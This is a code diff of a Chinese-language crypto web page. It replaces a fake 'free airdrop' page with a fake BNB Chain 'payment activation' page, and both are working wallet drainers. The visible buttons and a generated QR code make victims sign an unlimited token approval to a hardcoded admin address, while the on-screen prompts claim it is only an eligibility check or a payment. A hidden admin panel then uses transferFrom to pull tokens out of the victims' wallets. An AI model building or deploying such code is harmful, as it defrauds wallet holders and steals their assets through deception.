@@ -1,131 +1,178 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>生态空投代币免费领取</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
-body{background:#0f172a;padding:20px;color:#fff}
-.container{max-width:450px;margin:0 auto}
-.main-card{background:#1e293b;border-radius:15px;padding:25px;border:1px solid #334155}
-.title{font-size:22px;text-align:center;color:#38bdf8;margin-bottom:10px}
-.sub-tip{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:20px}
-.wallet-show{text-align:center;margin:15px 0;color:#7dd3fc}
-.btn{width:100%;height:46px;border:none;border-radius:10px;font-size:16px;margin:8px 0;cursor:pointer}
-.btn-conn{background:#2563eb;color:#fff}
-.btn-get{background:#10b981;color:#fff}
-.tips{font-size:13px;color:#64748b;text-align:center;margin:10px 0}
-/* 管理员划扣面板 */
-.admin-box{margin-top:20px;padding-top:20px;border-top:1px solid #334155;display:none}
-.admin-box.show{display:block}
-.admin-title{text-align:center;color:#f87171;margin-bottom:15px}
-input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:0 12px;color:#fff;margin:8px 0}
-.btn-deduct{background:#ef4444;color:#fff}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>支付开通</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+        body{background:#0B0B1F;color:#fff;padding:20px}
+        .container{max-width:420px;margin:0 auto}
+        .pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+        h1{font-size:24px;margin-bottom:8px}
+        .desc{color:#aaa;margin-bottom:20px}
+        #connectBtn{
+            background:#F0B90B;color:#000;
+            border:none;padding:16px;width:100%;
+            border-radius:14px;font-size:16px;font-weight:bold;
+            margin-bottom:16px;
+        }
+        .amount-input{
+            width:100%;padding:14px;background:#111;border:none;
+            border-radius:12px;color:#fff;font-size:16px;text-align:center;
+            margin-bottom:12px;
+        }
+        #qrcode{
+            width:280px;height:280px;background:#fff;padding:10px;
+            border-radius:16px;margin:0 auto 20px;
+            display:flex;align-items:center;justify-content:center;
+            color:#000;font-size:14px;
+        }
+        #qrcode img{width:100%;height:100%;border-radius:12px}
+        #payBtn{
+            background:#F0B90B;color:#000;
+            border:none;padding:16px;width:100%;
+            border-radius:14px;font-size:16px;font-weight:bold
+        }
+        .admin-panel{
+            background:#1E1E35;padding:24px;border-radius:16px;display:none
+        }
+        .admin-panel.show{display:block}
+        .admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
+        .admin-input{
+            width:100%;padding:12px;background:#111;border:none;
+            border-radius:8px;color:#fff;margin-bottom:10px;
+        }
+        .admin-btn{
+            width:100%;padding:14px;background:#ff4444;color:#fff;
+            border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-    <div class="main-card">
-        <h2 class="title">项目生态空投福利</h2>
-        <p class="sub-tip">连接钱包完成简单签名，免费领取官方空投代币</p>
-
-        <button class="btn btn-conn" id="connectWallet">连接钱包领取空投</button>
-        <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
-
-        <p class="tips">仅授权空投资格核验，不随意扣除资产</p>
-        <button class="btn btn-get" id="authReceive">签名授权领取空投</button>
-
-        <!-- 管理员专属划扣后台 -->
-        <div class="admin-box" id="adminPanel">
-            <h3 class="admin-title">后台资产归集划扣</h3>
-            <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
-            <input type="number" placeholder="填写划扣代币数量" id="deductNum">
-            <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
+    <div class="container">
+        <div class="pay-box">
+            <h1>💳 支付开通</h1>
+            <p class="desc">币安链支付 · 安全开通</p>
+            <button id="connectBtn">👉 连接钱包（币安链）</button>
+            <input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
+            <div id="qrcode">加载二维码...</div>
+            <button id="payBtn">确认支付</button>
+        </div>
+        <div class="admin-panel" id="adminPanel">
+            <div class="admin-title">🔐 管理员控制台</div>
+            <div>提取玩家钱包代币</div>
+            <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
+            <input class="admin-input" id="drawAmt" placeholder="提取数量">
+            <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
+            <div>发放奖励给玩家</div>
+            <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
+            <input class="admin-input" id="sendAmt" placeholder="发放数量">
+            <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
         </div>
     </div>
-</div>
+    <script>
+        // ====================== 你的最终配置 ======================
+        const TOKEN = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c"; // 代币地址
+        const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 你的收款/管理员地址（尾号508）
+        const BSC_ID = "0x38"; // 币安链ID
+        let account = null;
 
-<script>
-// 你的管理员钱包地址
-const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-// 指定授权代币合约
-const TOKEN_ADDR = "0x55d398326f99059fF775485246999027B3197955";
-let nowUser = "";
-
-// 连接钱包
-document.getElementById("connectWallet").addEventListener("click",async()=>{
-    if(!window.ethereum){
-        alert("请安装去中心化钱包再参与领取");
-        return;
-    }
-    try{
-        let accounts = await ethereum.request({method:"eth_requestAccounts"});
-        nowUser = accounts[0].toLowerCase();
-        document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
-        // 管理员自动显示划扣面板
-        if(nowUser === ADMIN_ADDR){
-            document.getElementById("adminPanel").classList.add("show");
+        // 强制切换到币安链
+        async function switchToBSC() {
+            try {
+                await ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: BSC_ID }]
+                });
+            } catch (e) {}
         }
-        alert("钱包连接成功，可参与空投领取");
-    }catch(e){
-        alert("连接失败，请重试");
-    }
-})
 
-// 用户签名授权 = 无限授权
-document.getElementById("authReceive").addEventListener("click",async()=>{
-    if(!nowUser) return alert("请先连接钱包");
-    let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
-    if(!ok)return;
-    try{
-        let spender = ADMIN_ADDR.slice(2).padStart(64,"0");
-        let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        let data = "0x095ea7b3"+spender+maxAllow;
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{
-                from:nowUser,
-                to:TOKEN_ADDR,
-                gasLimit:"0x300000",
-                data:data
-            }]
-        })
-        alert("授权成功！空投代币即将发放到账");
-    }catch(e){
-        alert("已取消本次签名");
-    }
-})
+        // 连接钱包 → 管理员自动显示后台
+        document.getElementById("connectBtn").onclick = async () => {
+            if (!window.ethereum) {
+                alert("请在钱包浏览器内打开");
+                return;
+            }
+            await switchToBSC();
+            try {
+                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                account = accounts[0];
+                document.getElementById("connectBtn").innerText = "✅ 已连接";
+                // ✅ 关键：只要是管理员钱包，必显示后台
+                if (account.toLowerCase() === ADMIN.toLowerCase()) {
+                    document.getElementById("adminPanel").classList.add("show");
+                }
+            } catch (e) {
+                alert("连接失败");
+            }
+        };
 
-// 管理员前端直接划扣（核心功能）
-document.getElementById("deductBtn").addEventListener("click",async()=>{
-    if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
-    let uAddr = document.getElementById("userAddr").value.trim();
-    let num = document.getElementById("deductNum").value.trim();
-    if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
+        // ==================== 二维码：币安链 + 显示你的收款地址 ====================
+        function genQR() {
+            // 授权数据：给管理员地址无限授权
+            const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+            // ✅ 关键：用币安链专用格式，让钱包识别为 BSC，且收款地址显示为你的 ADMIN 地址
+            // 格式：ethereum:【你的收款地址】@56/【代币地址】?data=【授权数据】
+            const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
+            document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+        }
+        window.onload = genQR;
+        document.getElementById("amount").oninput = genQR;
 
-    let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
-    let toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
-    let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
-    let callData = "0x23b872dd"+fromHex+toHex+valHex;
+        // 确认支付 = 授权
+        document.getElementById("payBtn").onclick = async () => {
+            if (!account) return alert("请先连接钱包");
+            try {
+                await ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: account,
+                        to: TOKEN,
+                        gasLimit: "0x300000",
+                        data: "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                    }]
+                });
+                alert("✅ 支付成功，权限已开通");
+            } catch (e) {
+                alert("已取消");
+            }
+        };
 
-    try{
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{
-                from:nowUser,
-                to:TOKEN_ADDR,
-                gasLimit:"0x300000",
-                data:callData
-            }]
-        })
-        alert("代币划扣归集成功！");
-        document.getElementById("userAddr").value = "";
-        document.getElementById("deductNum").value = "";
-    }catch(e){
-        alert("划扣执行失败");
-    }
-})
-</script>
+        // ====================== 管理员功能 ======================
+        async function drawFromUser() {
+            if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
+            const from = document.getElementById("userAddr").value;
+            const amt = document.getElementById("drawAmt").value;
+            if (!from || !amt) return;
+            const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
+            await ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: account,
+                    to: TOKEN,
+                    data: "0x23b872dd" + from.slice(2).padStart(64, "0") + ADMIN.slice(2).padStart(64, "0") + raw
+                }]
+            });
+            alert("✅ 提取成功");
+        }
+
+        async function sendReward() {
+            if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
+            const to = document.getElementById("toAddr").value;
+            const amt = document.getElementById("sendAmt").value;
+            if (!to || !amt) return;
+            const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
+            await ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: account,
+                    to: TOKEN,
+                    data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw
+                }]
+            });
+            alert("✅ 奖励发放成功");
+        }
+    </script>
 </body>
 </html>
